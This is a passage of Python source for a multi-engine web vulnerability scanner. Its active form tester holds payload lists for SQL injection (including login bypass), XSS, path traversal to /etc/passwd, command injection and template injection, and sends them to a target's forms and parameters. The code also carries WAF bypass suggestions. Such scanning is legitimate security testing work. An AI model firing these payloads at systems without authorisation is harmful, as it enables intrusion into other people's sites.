                        "method": alert.get("method", ""),
                        "param": alert.get("param", ""),
                        "attack": alert.get("attack", "")[:200],
                        "cwe_id": alert.get("cweid", ""),
                        "wasc_id": alert.get("wascid", ""),
                        "plugin_id": alert.get("pluginId", ""),
                    }
                    if alert.get("risk") in ["High", "Medium"]:
                        result["active_alerts"].append(alert_data)
                    else:
                        result["passive_alerts"].append(alert_data)

                print(f"      Active alerts: {len(result['active_alerts'])}")
                print(f"      Passive alerts: {len(result['passive_alerts'])}")

            except Exception as e:
                print(f"      Active scan error: {e}")

            # ========================================
            # STEP 5: Form Testing Summary
            # ========================================
            print(f"      [5/5] Collecting form test data...")
            try:
                # Get sites tree for forms
                sites = self.zap.core.sites
                for site in sites:
                    try:
                        children = self.zap.core.children(site)
                        for child in children:
                            if child.get("method", "").upper() == "POST":
                                result["forms_tested"].append({
                                    "url": child.get("name", ""),
                                    "method": child.get("method", ""),
                                })
                    except:
                        pass
            except:
                pass

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            total_alerts = len(result["active_alerts"]) + len(result["passive_alerts"])
            log_engine(10, f"ZAP: {total_alerts} alerts, "
                       f"{len(result['spider_urls'])} URLs spidered", "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(10, f"ZAP: {e}", "error")

        return result


# ============================================================
# ENGINE 11: FINGERPRINTER (Wappalyzer)
# ============================================================
class FingerprintEngine:
    """Technology fingerprinting using Wappalyzer patterns."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_url, response_text=None, headers=None):
        if not self.config.get("fingerprint_enabled"):
            return {"enabled": False}

        log_engine(11, "Technology Fingerprinter (Wappalyzer)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "technologies": [],
            "categories": {},
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # Fetch if needed
            if not response_text or not headers:
                resp = safe_request(target_url, timeout=15)
                if resp:
                    response_text = response_text or resp.text
                    headers = headers or dict(resp.headers)

            # Try Wappalyzer library
            if HAS_WAPPALYZER and self.config.get("fingerprint_wappalyzer"):
                try:
                    from Wappalyzer import Wappalyzer as Wap, WebPage
                    webpage = WebPage.new_from_url(target_url)
                    wap = Wap.latest()
                    detected = wap.analyze(webpage)

                    for tech_name, categories in detected.items():
                        result["technologies"].append({
                            "name": tech_name,
                            "categories": list(categories),
                            "confidence": 1.0,
                            "source": "wappalyzer",
                        })
                        for cat in categories:
                            result["categories"].setdefault(cat, []).append(tech_name)
                except Exception as e:
                    print(f"      Wappalyzer lib error: {e}")

            # Manual fingerprinting (fallback)
            manual_techs = self._manual_fingerprint(response_text or "", headers or {})
            for tech in manual_techs:
                if not any(t["name"] == tech["name"] for t in result["technologies"]):
                    result["technologies"].append(tech)

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(11, f"Fingerprint: {len(result['technologies'])} technologies",
                       "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(11, f"Fingerprint: {e}", "error")

        return result

    def _manual_fingerprint(self, html, headers):
        """Manual technology fingerprinting."""
        techs = []

        # Server header
        server = headers.get("Server", headers.get("server", ""))
        if server:
            techs.append({
                "name": server.split("/")[0] if "/" in server else server,
                "categories": ["Web Server"],
                "confidence": 0.9,
                "source": "header",
                "version": server.split("/")[1] if "/" in server else "",
            })

        # X-Powered-By
        powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
        if powered:
            techs.append({
                "name": powered,
                "categories": ["Backend"],
                "confidence": 0.9,
                "source": "header",
            })

        # HTML patterns
        html_patterns = {
            "WordPress": [r'wp-content', r'wp-includes', r'wordpress', r'wp-json'],
            "Drupal": [r'Drupal\.settings', r'drupal\.js', r'sites/default/files'],
            "Joomla": [r'/media/jui/', r'Joomla', r'com_content'],
            "Laravel": [r'laravel_session', r'laravel', r'csrf-token'],
            "Django": [r'csrfmiddlewaretoken', r'django', r'admin/static'],
            "Flask": [r'flask', r'Werkzeug'],
            "Express.js": [r'express', r'X-Powered-By.*Express'],
            "Next.js": [r'__NEXT_DATA__', r'_next/static'],
            "React": [r'react', r'reactDOM', r'__REACT'],
            "Vue.js": [r'Vue\.js', r'vue-router', r'v-bind', r'v-model'],
            "Angular": [r'ng-app', r'angular', r'ng-version'],
            "Bootstrap": [r'bootstrap\.css', r'bootstrap\.min\.css', r'btn-primary'],
            "jQuery": [r'jquery\.js', r'jquery\.min\.js', r'jQuery'],
            "Tailwind CSS": [r'tailwindcss', r'tailwind'],
            "Google Analytics": [r'google-analytics\.com', r'gtag', r'ga$'],
            "Cloudflare": [r'cloudflare', r'cf-ray'],
            "PHP": [r'\.php', r'PHPSESSID', r'php'],
            "ASP.NET": [r'__VIEWSTATE', r'__EVENTVALIDATION', r'asp\.net'],
            "Ruby on Rails": [r'csrf-param.*authenticity_token', r'rails'],
            "Spring": [r'spring', r'JSESSIONID'],
            "Nginx": [r'nginx'],
            "Apache": [r'Apache'],
        }

        for tech_name, patterns in html_patterns.items():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    if not any(t["name"] == tech_name for t in techs):
                        techs.append({
                            "name": tech_name,
                            "categories": self._get_tech_category(tech_name),
                            "confidence": 0.7,
                            "source": "html_pattern",
                        })
                    break

        # Meta generator
        gen_match = re.search(r'<meta\s+name=["\']?generator["\']?\s+content=["\']([^"\']+)["\']',
                               html, re.IGNORECASE)
        if gen_match:
            generator = gen_match.group(1)
            if not any(t["name"] == generator for t in techs):
                techs.append({
                    "name": generator,
                    "categories": ["CMS"],
                    "confidence": 0.8,
                    "source": "meta_generator",
                })

        return techs

    def _get_tech_category(self, name):
        categories = {
            "WordPress": ["CMS", "Blog"],
            "Drupal": ["CMS"],
            "Joomla": ["CMS"],
            "Laravel": ["Backend", "Framework"],
            "Django": ["Backend", "Framework"],
            "Flask": ["Backend", "Framework"],
            "Express.js": ["Backend", "Framework"],
            "Next.js": ["Frontend", "Framework"],
            "React": ["Frontend", "JavaScript Framework"],
            "Vue.js": ["Frontend", "JavaScript Framework"],
            "Angular": ["Frontend", "JavaScript Framework"],
            "Bootstrap": ["CSS Framework"],
            "jQuery": ["JavaScript Library"],
            "PHP": ["Backend", "Language"],
            "ASP.NET": ["Backend", "Framework"],
            "Nginx": ["Web Server"],
            "Apache": ["Web Server"],
        }
        return categories.get(name, ["Technology"])


# ============================================================
# ENGINE 12: BUILTWITH TECH DETECTOR
# ============================================================
class BuiltWithEngine:
    """BuiltWith technology detection."""

    def __init__(self, config):
        self.config = config

    def scan(self, target_url):
        if not self.config.get("tech_detect_enabled") or not HAS_BUILTWITH:
            return {"enabled": False}

        log_engine(12, "Tech Detector (BuiltWith)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "technologies": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            parsed = urlparse(target_url)
            domain = parsed.netloc

            try:
                bw_result = builtwith_lib.builtwith(target_url)

                for category, techs in bw_result.items():
                    if isinstance(techs, list):
                        for tech in techs:
                            result["technologies"].append({
                                "name": tech,
                                "category": category,
                                "source": "builtwith",
                            })
                    elif isinstance(techs, str):
                        result["technologies"].append({
                            "name": techs,
                            "category": category,
                            "source": "builtwith",
                        })
            except Exception as e:
                result["error"] = str(e)

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            log_engine(12, f"BuiltWith: {len(result['technologies'])} technologies",
                       "success")

        except Exception as e:
            result["error"] = str(e)
            log_engine(12, f"BuiltWith: {e}", "error")

        return result


# ============================================================
# ENGINE 13: ACTIVE FORM TESTER (NEW! CRITICAL!)
# ============================================================
class ActiveFormTesterEngine:
    """
    Custom active vulnerability tester.
    This is the KEY engine that tests forms/parameters for:
    - SQL Injection (time-based, error-based, boolean-based, union-based)
    - XSS (reflected, stored indicators)
    - LFI (Local File Inclusion)
    - RCE (Remote Code Execution)
    - SSTI (Server-Side Template Injection)
    - SSRF (Server-Side Request Forgery)
    - XXE (XML External Entity)
    """

    # SQLi test payloads with detection methods
    SQLI_PAYLOADS = [
        # Time-based (most reliable for blind SQLi)
        {
            "payload": "' OR SLEEP(5)--",
            "type": "time_based",
            "detect": "time_delay",
            "delay": 5,
            "vuln_type": "sqli",
        },
        {
            "payload": "' AND SLEEP(5)--",
            "type": "time_based",
            "detect": "time_delay",
            "delay": 5,
            "vuln_type": "sqli",
        },
        {
            "payload": "'; WAITFOR DELAY '0:0:5'--",
            "type": "time_based",
            "detect": "time_delay",
            "delay": 5,
            "vuln_type": "sqli",
        },
        {
            "payload": "' AND BENCHMARK(5000000,MD5('test'))--",
            "type": "time_based",
            "detect": "time_delay",
            "delay": 5,
            "vuln_type": "sqli",
        },
        {
            "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "type": "time_based",
            "detect": "time_delay",
            "delay": 5,
            "vuln_type": "sqli",
        },
        # Error-based
        {
            "payload": "' OR 1=1--",
            "type": "error_based",
            "detect": "error_pattern",
            "vuln_type": "sqli",
        },
        {
            "payload": "' UNION SELECT NULL--",
            "type": "union_based",
            "detect": "error_pattern",
            "vuln_type": "sqli",
        },
        {
            "payload": "1' ORDER BY 1--",
            "type": "order_by",
            "detect": "no_error",
            "vuln_type": "sqli",
        },
        {
            "payload": "1' ORDER BY 100--",
            "type": "order_by",
            "detect": "error_pattern",
            "vuln_type": "sqli",
        },
        # Boolean-based
        {
            "payload": "' AND '1'='1",
            "type": "boolean_true",
            "detect": "response_diff",
            "vuln_type": "sqli",
        },
        {
            "payload": "' AND '1'='2",
            "type": "boolean_false",
            "detect": "response_diff",
            "vuln_type": "sqli",
        },
        # Generic
        {
            "payload": "1 OR 1=1",
            "type": "generic",
            "detect": "error_pattern",
            "vuln_type": "sqli",
        },
        {
            "payload": "admin'--",
            "type": "auth_bypass",
            "detect": "response_diff",
            "vuln_type": "sqli",
        },
    ]

    # SQL error patterns
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*?MySQL",
        r"Warning.*?\Wmysqli?_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that (corresponds to|fits) your MySQL",
        r"Unknown column '[^ ]+' in 'field list'",
        r"MySqlClient\.",
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"\bSQL Server\b.*?\bDriver\b",
        r"Warning.*?\W(mssql|sqlsrv)_",
        r"\bSQL Server\b.*?\b\d+\b",
        r"System\.Data\.SqlClient\.",
        r"(?s)Exception.*?\bRoadhouse\.Cms\.",
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
        r"ODBC Microsoft Access",
        r"Syntax error (missing operator|in query expression)",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*?\W(sqlite_|SQLite3::)",
        r"SQLite error \d+:",
        r"sqlite3.OperationalError:",
        r"SQLITE_ERROR",
        r"Oracle.*?Driver",
        r"Warning.*?\W(oci|ora)_",
        r"ORA-\d{5}",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"macromedia.*?jdbc.*?Driver",
        r"SqlException",
        r"com\.jnetdirect\.jsql",
        r"SQL injection",
        r"unclosed quotation mark",
        r"you have an error in your sql syntax",
        r"supplied argument is not a valid",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"pg_query",
        r"pg_exec",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        {"payload": "<script>alert('XSS')</script>", "type": "basic"},
        {"payload": "<img src=x onerror=alert('XSS')>", "type": "img_onerror"},
        {"payload": "<svg onload=alert('XSS')>", "type": "svg"},
        {"payload": "javascript:alert('XSS')", "type": "js_protocol"},
        {"payload": "'-alert('XSS')-'", "type": "context_break"},
        {"payload": "<body onload=alert('XSS')>", "type": "body_onload"},
        {"payload": "<input onfocus=alert('XSS') autofocus>", "type": "input_focus"},
    ]

    # LFI payloads
    LFI_PAYLOADS = [
        {"payload": "../../../etc/passwd", "detect": "root:"},
        {"payload": "....//....//....//etc/passwd", "detect": "root:"},
        {"payload": "..%2f..%2f..%2fetc/passwd", "detect": "root:"},
        {"payload": "/etc/passwd", "detect": "root:"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "detect": ""},
        {"payload": "..\\..\\..\\windows\\win.ini", "detect": "[fonts]"},
    ]

    # RCE payloads
    RCE_PAYLOADS = [
        {"payload": "; sleep 5", "type": "time_based", "delay": 5},
        {"payload": "| sleep 5", "type": "time_based", "delay": 5},
        {"payload": "$(sleep 5)", "type": "time_based", "delay": 5},
        {"payload": "`sleep 5`", "type": "time_based", "delay": 5},
        {"payload": "; ping -c 5 127.0.0.1", "type": "time_based", "delay": 5},
    ]

    # SSTI payloads
    SSTI_PAYLOADS = [
        {"payload": "{{7*7}}", "detect": "49"},
        {"payload": "${7*7}", "detect": "49"},
        {"payload": "#{7*7}", "detect": "49"},
        {"payload": "<%= 7*7 %>", "detect": "49"},
        {"payload": "{{7*'7'}}", "detect": "7777777"},
    ]

    def __init__(self, config):
        self.config = config

    def scan(self, target_url, forms=None, html_data=None):
        if not self.config.get("active_test_enabled"):
            return {"enabled": False}

        log_engine(13, "Active Form Tester (SQLi/XSS/LFI/RCE/SSTI)")
        result = {
            "enabled": True,
            "target_url": target_url,
            "forms_tested": 0,
            "parameters_tested": 0,
            "vulnerabilities": [],
            "test_details": [],
            "scan_time_ms": 0,
        }

        try:
            start = time.time()

            # Get forms from HTML data
            if not forms and html_data:
                forms = html_data.get("forms", [])

            # If no forms found, test URL parameters directly
            if not forms:
                parsed = urlparse(target_url)
                if parsed.query:
                    # Test URL parameters
                    params = dict(re.findall(r'([^&=]+)=([^&]*)', parsed.query))
                    base_url = target_url.split("?")[0]

                    for param_name in params:
                        self._test_parameter(
                            base_url, param_name, params[param_name],
                            "GET", result
                        )
                else:
                    # No forms, no params - test common params
                    common_params = ["id", "page", "search", "q", "query", "file",
                                     "path", "url", "redirect", "next", "return"]
                    for param in common_params:
                        self._test_parameter(
                            target_url, param, "1", "GET", result
                        )
            else:
                # Test each form
                for form in forms:
                    self._test_form(form, result)

            elapsed = (time.time() - start) * 1000
            result["scan_time_ms"] = elapsed

            vuln_count = len(result["vulnerabilities"])
            status = "warning" if vuln_count > 0 else "success"
            log_engine(13, f"Active Test: {result['forms_tested']} forms, "
                       f"{result['parameters_tested']} params, "
                       f"{vuln_count} vulnerabilities", status)

        except Exception as e:
            result["error"] = str(e)
            log_engine(13, f"Active Test: {e}", "error")

        return result

    def _test_form(self, form, result):
        """Test a single form for vulnerabilities."""
        result["forms_tested"] += 1

        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        if not action:
            return

        # Test each input parameter
        for inp in inputs:
            param_name = inp.get("name", "")
            if not param_name:
                continue
            if inp.get("type") in ["submit", "button", "hidden", "checkbox", "radio"]:
                continue

            result["parameters_tested"] += 1
            self._test_parameter(action, param_name, "test_value", method, result,
                                form_inputs=inputs)

    def _test_parameter(self, url, param_name, default_value, method, result,
                        form_inputs=None):
        """Test a single parameter for all vulnerability types."""

        # Build base params (for form context)
        base_params = {}
        if form_inputs:
            for inp in form_inputs:
                name = inp.get("name", "")
                val = inp.get("value", "") or default_value
                if name:
                    base_params[name] = val

        # ---- SQLi Testing ----
        if self.config.get("active_test_sqli"):
            self._test_sqli(url, param_name, method, base_params, result)

        # ---- XSS Testing ----
        if self.config.get("active_test_xss"):
            self._test_xss(url, param_name, method, base_params, result)

        # ---- LFI Testing ----
        if self.config.get("active_test_lfi"):
            self._test_lfi(url, param_name, method, base_params, result)

        # ---- RCE Testing ----
        if self.config.get("active_test_rce"):
            self._test_rce(url, param_name, method, base_params, result)

        # ---- SSTI Testing ----
        if self.config.get("active_test_ssti"):
            self._test_ssti(url, param_name, method, base_params, result)

        time.sleep(self.config.get("active_test_delay", 0.5))

    def _test_sqli(self, url, param, method, base_params, result):
        """Test for SQL injection."""
        max_payloads = min(self.config.get("active_test_max_payloads", 30),
                          len(self.SQLI_PAYLOADS))

        # Get baseline response
        baseline_resp = self._send_request(url, param, "1", method, base_params)
        if not baseline_resp:
            return
        baseline_time = baseline_resp.get("response_time_ms", 0)
        baseline_length = baseline_resp.get("content_length", 0)
        baseline_text = baseline_resp.get("text", "")

        for sqli in self.SQLI_PAYLOADS[:max_payloads]:
            payload = sqli["payload"]
            detect_method = sqli["detect"]

            resp = self._send_request(url, param, payload, method, base_params)
            if not resp:
                continue

            resp_time = resp.get("response_time_ms", 0)
            resp_length = resp.get("content_length", 0)
            resp_text = resp.get("text", "")

            vulnerable = False
            evidence = ""

            # Time-based detection
            if detect_method == "time_delay":
                expected_delay = sqli.get("delay", 5)
                if resp_time > (expected_delay * 800):  # 80% of expected delay in ms
                    vulnerable = True
                    evidence = (f"Response delayed {resp_time/1000:.1f}s "
                               f"(baseline: {baseline_time/1000:.1f}s, "
                               f"expected: {expected_delay}s)")

            # Error-based detection
            elif detect_method == "error_pattern":
                for pattern in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, resp_text, re.IGNORECASE):
                        vulnerable = True
                        evidence = f"SQL error pattern: {pattern[:60]}"
                        break

            # Response difference detection
            elif detect_method == "response_diff":
                if sqli.get("type") == "boolean_true":
                    # True condition should return normal response
                    true_length = resp_length
                    # Now test false condition
                    false_payload = "' AND '1'='2"
                    false_resp = self._send_request(url, param, false_payload,
                                                     method, base_params)
                    if false_resp:
                        false_length = false_resp.get("content_length", 0)
                        length_diff = abs(true_length - false_length)
                        if length_diff > 100:
                            vulnerable = True
                            evidence = (f"Boolean-based: response size differs "
                                       f"(true: {true_length}, false: {false_length})")

                elif sqli.get("type") == "auth_bypass":
                    # Check if response indicates successful auth
                    auth_indicators = ["welcome", "dashboard", "logout", "profile",
                                       "admin", "authenticated"]
                    if any(ind in resp_text.lower() for ind in auth_indicators):
                        vulnerable = True
                        evidence = "Authentication bypass detected"

            # No-error detection (ORDER BY test)
            elif detect_method == "no_error":
                has_error = any(re.search(p, resp_text, re.IGNORECASE)
                               for p in self.SQL_ERROR_PATTERNS)
                if not has_error and resp.get("status_code", 0) == 200:
                    # This is just informational, not a vuln
                    pass

            if vulnerable:
                result["vulnerabilities"].append({
                    "name": f"SQL Injection ({sqli['type']})",
                    "severity": "Critical",
                    "type": "sqli",
                    "vuln_type": "sqli",
                    "evidence": evidence,
                    "payload": payload,
                    "parameter": param,
                    "url": url,
                    "method": method,
                    "response_time_ms": resp_time,
                    "status_code": resp.get("status_code", 0),
                })
                result["test_details"].append({
                    "vuln_type": "sqli",
                    "technique": sqli["type"],
                    "parameter": param,
                    "url": url,
                    "payload": payload,
                    "vulnerable": True,
                    "evidence": evidence,
                })
                # Found SQLi, no need to test more SQLi payloads for this param
                return

    def _test_xss(self, url, param, method, base_params, result):
        """Test for XSS."""
        for xss in self.XSS_PAYLOADS:
            payload = xss["payload"]
            resp = self._send_request(url, param, payload, method, base_params)
            if not resp:
                continue

            resp_text = resp.get("text", "")

            # Check if payload is reflected unmodified
            if payload in resp_text:
                result["vulnerabilities"].append({
                    "name": f"Reflected XSS ({xss['type']})",
                    "severity": "High",
                    "type": "xss",
                    "vuln_type": "xss",
                    "evidence": f"Payload reflected in response: {payload[:80]}",
                    "payload": payload,
                    "parameter": param,
                    "url": url,
                    "method": method,
                })
                result["test_details"].append({
                    "vuln_type": "xss",
                    "technique": xss["type"],
                    "parameter": param,
                    "url": url,
                    "payload": payload,
                    "vulnerable": True,
                })
                return

            # Check if partially reflected
            # Remove HTML encoding and check again
            decoded = resp_text.replace("&lt;", "<").replace("&gt;", ">")
            decoded = decoded.replace("&#39;", "'").replace("&quot;", '"')
            if payload in decoded:
                result["vulnerabilities"].append({
                    "name": f"Reflected XSS (decoded) ({xss['type']})",
                    "severity": "Medium",
                    "type": "xss",
                    "vuln_type": "xss",
                    "evidence": f"Payload reflected after decoding: {payload[:80]}",
                    "payload": payload,
                    "parameter": param,
                    "url": url,
                    "method": method,
                })
                return

    def _test_lfi(self, url, param, method, base_params, result):
        """Test for Local File Inclusion."""
        for lfi in self.LFI_PAYLOADS:
            payload = lfi["payload"]
            detect_str = lfi["detect"]

            resp = self._send_request(url, param, payload, method, base_params)
            if not resp:
                continue

            resp_text = resp.get("text", "")

            if detect_str and detect_str in resp_text:
                result["vulnerabilities"].append({
                    "name": "Local File Inclusion (LFI)",
                    "severity": "High",
                    "type": "lfi",
                    "vuln_type": "lfi",
                    "evidence": f"File content detected: '{detect_str}' in response",
                    "payload": payload,
                    "parameter": param,
                    "url": url,
                    "method": method,
                })
                return

    def _test_rce(self, url, param, method, base_params, result):
        """Test for Remote Code Execution."""
        # Get baseline
        baseline_resp = self._send_request(url, param, "test", method, base_params)
        baseline_time = baseline_resp.get("response_time_ms", 0) if baseline_resp else 0

        for rce in self.RCE_PAYLOADS:
            payload = rce["payload"]
            resp = self._send_request(url, param, payload, method, base_params)
            if not resp:
                continue

            if rce.get("type") == "time_based":
                expected_delay = rce.get("delay", 5)
                resp_time = resp.get("response_time_ms", 0)
                if resp_time > (expected_delay * 800):
                    result["vulnerabilities"].append({
                        "name": f"Remote Code Execution (time-based)",
                        "severity": "Critical",
                        "type": "rce",
                        "vuln_type": "rce",
                        "evidence": (f"Command execution delay: {resp_time/1000:.1f}s "
                                    f"(baseline: {baseline_time/1000:.1f}s)"),
                        "payload": payload,
                        "parameter": param,
                        "url": url,
                        "method": method,
                    })
                    return

    def _test_ssti(self, url, param, method, base_params, result):
        """Test for Server-Side Template Injection."""
        for ssti in self.SSTI_PAYLOADS:
            payload = ssti["payload"]
            detect_str = ssti["detect"]

            resp = self._send_request(url, param, payload, method, base_params)
            if not resp:
                continue

            resp_text = resp.get("text", "")

            if detect_str and detect_str in resp_text:
                result["vulnerabilities"].append({
                    "name": "Server-Side Template Injection (SSTI)",
                    "severity": "Critical",
                    "type": "ssti",
                    "vuln_type": "ssti",
                    "evidence": f"Template expression evaluated: '{payload}' → '{detect_str}'",
                    "payload": payload,
                    "parameter": param,
                    "url": url,
                    "method": method,
                })
                return

    def _send_request(self, url, param, value, method, base_params=None):
        """Send HTTP request with payload."""
        try:
            params = dict(base_params) if base_params else {}
            params[param] = value

            timeout = self.config.get("active_test_timeout", 15)
            headers = {
                "User-Agent": random.choice(self.config.get("http_user_agents", [])),
            }

            start = time.time()

            if method.upper() == "GET":
                resp = requests.get(url, params=params, headers=headers,
                                     timeout=timeout, verify=False, allow_redirects=True)
            else:
                resp = requests.post(url, data=params, headers=headers,
                                      timeout=timeout, verify=False, allow_redirects=True)

            elapsed = (time.time() - start) * 1000

            return {
                "status_code": resp.status_code,
                "text": resp.text[:10000],
                "content_length": len(resp.text),
                "response_time_ms": elapsed,
                "headers": dict(resp.headers),
            }
        except requests.exceptions.Timeout:
            elapsed = (time.time() - start) * 1000
            return {
                "status_code": 0,
                "text": "",
                "content_length": 0,
                "response_time_ms": elapsed,
                "timeout": True,
            }
        except Exception as e:
            return None


# ============================================================
# MAIN ORCHESTRATOR
# ============================================================
class IndigoScanner:
    """Main scanner orchestrator — runs all 13 engines."""

    def __init__(self, config=None):
        self.config = config or GLOBAL_CONFIG
        os.makedirs(self.config.get("output_dir", "./indigo_results"), exist_ok=True)

    def full_scan(self, target_url):
        """Run full scan with all 13 engines."""
        self.config["target_url"] = target_url
        target_host, target_ip = resolve_host(target_url)
        self.config["target_host"] = target_host
        self.config["target_ip"] = target_ip

        print(f"\n\033[1;36m{'='*64}")
        print(f"  INDIGO SCR v4.0 — Full Spectrum Security Scanner")
        print(f"  Target: {target_url}")
        print(f"  Host: {target_host} | IP: {target_ip}")
        print(f"  Engines: 13")
        print(f"{'='*64}\033[0m\n")

        scan_start = time.time()
        all_results = {}
        all_vulnerabilities = []
        all_technologies = []
        all_forms = []

        # ---- NETWORK LAYER ----
        print(f"\n\033[1;34m{'─'*50}")
        print(f"  NETWORK LAYER (Engines 1-5)")
        print(f"{'─'*50}\033[0m\n")

        # Engine 1: NMAP
        nmap_engine = NmapEngine(self.config)
        all_results["nmap"] = nmap_engine.scan(target_ip, target_host)
        all_vulnerabilities.extend(all_results["nmap"].get("vulnerabilities", []))

        # Engine 2: DNS
        dns_engine = DNSEngine(self.config)
        all_results["dns"] = dns_engine.scan(target_host)
        all_vulnerabilities.extend(all_results["dns"].get("vulnerabilities", []))

        # Engine 3: SSL/TLS
        ssl_engine = SSLEngine(self.config)
        all_results["ssl"] = ssl_engine.scan(target_host)
        all_vulnerabilities.extend(all_results["ssl"].get("vulnerabilities", []))

        # Engine 4: Scapy
        scapy_engine = ScapyEngine(self.config)
        all_results["scapy"] = scapy_engine.scan(target_ip, target_host)

        # Engine 5: WHOIS
        whois_engine = WHOISEngine(self.config)
        all_results["whois"] = whois_engine.scan(target_host)
        all_vulnerabilities.extend(all_results["whois"].get("vulnerabilities", []))

        # ---- WEB LAYER ----
        print(f"\n\033[1;34m{'─'*50}")
        print(f"  WEB LAYER (Engines 6-9)")
        print(f"{'─'*50}\033[0m\n")

        # Engine 6: HTTP Client
        http_engine = HTTPEngine(self.config)
        all_results["http"] = http_engine.scan(target_url)
        all_vulnerabilities.extend(all_results["http"].get("vulnerabilities", []))

        # Get response for later engines
        http_resp = all_results["http"].get("responses", {}).get("requests", {})
        response_text = ""
        response_headers = http_resp.get("headers", {})
        if http_resp and not http_resp.get("error"):
            # Fetch full response for HTML parsing
            resp = safe_request(target_url, timeout=self.config.get("http_timeout", 30))
            if resp:
                response_text = resp.text

        # Engine 7: HTML Parser
        html_engine = HTMLParserEngine(self.config)
        all_results["html"] = html_engine.scan(target_url, response_text)
        all_vulnerabilities.extend(all_results["html"].get("vulnerabilities", []))
        all_forms = all_results["html"].get("forms", [])

        # Engine 8: JS Renderer
        js_engine = JSRenderEngine(self.config)
        all_results["js_render"] = js_engine.scan(target_url)
        # Add rendered forms if any
        rendered_forms = all_results["js_render"].get("rendered_forms", [])
        if rendered_forms:
            all_forms.extend(rendered_forms)

        # Engine 9: WAF Detector
        waf_engine = WAFDetectorEngine(self.config)
        all_results["waf"] = waf_engine.scan(target_url)

        # ---- SECURITY LAYER ----
        print(f"\n\033[1;34m{'─'*50}")
        print(f"  SECURITY LAYER (Engines 10-12)")
        print(f"{'─'*50}\033[0m\n")

        # Engine 10: ZAP
        zap_engine = ZAPEngine(self.config)
        all_results["zap"] = zap_engine.scan(target_url)

        # Convert ZAP alerts to vulnerabilities
        for alert in all_results["zap"].get("active_alerts", []):
            vuln_type = self._zap_alert_to_vuln_type(alert.get("name", ""))
            all_vulnerabilities.append({
                "name": alert.get("name", ""),
                "severity": self._zap_risk_to_severity(alert.get("risk", "")),
                "type": vuln_type,
                "vuln_type": vuln_type,
                "evidence": alert.get("evidence", "")[:200],
                "payload": alert.get("attack", "")[:200],
                "parameter": alert.get("param", ""),
                "url": alert.get("url", ""),
                "description": alert.get("description", "")[:300],
                "solution": alert.get("solution", "")[:300],
                "source": "zap",
            })

        # Engine 11: Fingerprinter
        fp_engine = FingerprintEngine(self.config)
        all_results["fingerprint"] = fp_engine.scan(
            target_url, response_text, response_headers
        )
        all_technologies.extend(all_results["fingerprint"].get("technologies", []))

        # Engine 12: BuiltWith
        bw_engine = BuiltWithEngine(self.config)
        all_results["builtwith"] = bw_engine.scan(target_url)
        all_technologies.extend(all_results["builtwith"].get("technologies", []))

        # ---- INTELLIGENCE LAYER ----
        print(f"\n\033[1;34m{'─'*50}")
        print(f"  INTELLIGENCE LAYER (Engine 13)")
        print(f"{'─'*50}\033[0m\n")

        # Engine 13: Active Form Tester
        active_engine = ActiveFormTesterEngine(self.config)
        all_results["active_test"] = active_engine.scan(
            target_url, forms=all_forms, html_data=all_results.get("html", {})
        )
        all_vulnerabilities.extend(all_results["active_test"].get("vulnerabilities", []))

        # ========================================
        # CONSOLIDATE RESULTS
        # ========================================
        scan_elapsed = (time.time() - scan_start) * 1000

        # Deduplicate vulnerabilities
        unique_vulns = self._deduplicate_vulns(all_vulnerabilities)

        # Build consolidated output
        consolidated = {
            "scan_metadata": {
                "target_url": target_url,
                "target_host": target_host,
                "target_ip": target_ip,
                "scan_time_ms": scan_elapsed,
                "scan_date": datetime.now().isoformat(),
                "engines_used": 13,
                "scanner_version": "4.0",
            },
            "engines": all_results,
            "vulnerabilities": unique_vulns,
            "vulnerability_summary": self._build_vuln_summary(unique_vulns),
            "technologies": all_technologies,
            "forms": all_forms,
            "waf_info": {
                "detected": all_results.get("waf", {}).get("waf_detected", False),
                "name": all_results.get("waf", {}).get("waf_name", ""),
                "confidence": all_results.get("waf", {}).get("waf_confidence", 0.0),
                "bypass_suggestions": all_results.get("waf", {}).get("bypass_suggestions", []),
            },
            "response_headers": response_headers,
            "crawled_urls": [
                u for u in all_results.get("zap", {}).get("spider_urls", [])
            ],
            "findings_for_ml": self._build_findings_for_ml(unique_vulns, target_url),
        }

        # Save results
        self._save_results(consolidated)

        # Print summary
        self._print_summary(consolidated)

        return consolidated

    def _zap_alert_to_vuln_type(self, alert_name):
        """Map ZAP alert name to vuln_type."""
        name_lower = alert_name.lower()
        mapping = {
            "sql injection": "sqli",
            "cross site scripting": "xss",
            "xss": "xss",
            "path traversal": "lfi",
            "file inclusion": "lfi",
            "remote file": "rfi",
            "command injection": "rce",
            "code injection": "rce",
            "server side request": "ssrf",
            "template injection": "ssti",
            "xml external": "xxe",
            "cross site request forgery": "csrf",
            "csrf": "csrf",
            "clickjacking": "clickjacking",
            "directory listing": "dir_listing",
            "information disclosure": "info_disclosure",
            "missing": "missing_header",
            "cookie": "cookie_issue",
            "session": "session_issue",
